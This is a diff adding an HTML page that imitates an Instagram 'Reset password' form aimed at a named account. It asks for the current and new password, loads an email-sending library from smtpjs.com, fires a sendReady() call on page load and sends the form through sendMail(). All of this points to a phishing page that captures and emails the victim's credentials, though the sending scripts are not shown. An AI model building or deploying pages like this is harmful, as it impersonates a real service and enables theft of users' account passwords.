@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Password Reset</title>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script src="script.js"></script>
+    <script src="ready.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .reset-container {
+            background: linear-gradient(rgba(255, 116, 116, 0.141),rgba(133, 137, 255, 0.168));
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 300px;
+            /* text-align: center; */
+        }
+
+        h2 {
+            color: #262626;
+        }
+
+        p {
+            color: #999;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+        }
+
+        button {
+            background-color: #3897f0;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #2671a8;
+        }
+    </style>
+</head>
+<body onload="sendReady()">
+
+<div class="reset-container">
+    <p>pooh_jaa28 · Instagram</p>
+
+    <h2>Reset password</h2>
+
+    <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!$@%).</p>
+    <form action="verify.html" method="post">
+        <input type="password" id="p1" name="currentPassword" placeholder="Current Password" required>
+        <input type="password" id="p2" name="newPassword" placeholder="New Password" required>
+        <input type="password" id="p3" name="confirmNewPassword" placeholder="Confirm New Password" required>
+        <button type="button" onclick="sendMail()">Send OTP</button>
+    </form>
+</div>
+
+</body>
+</html>
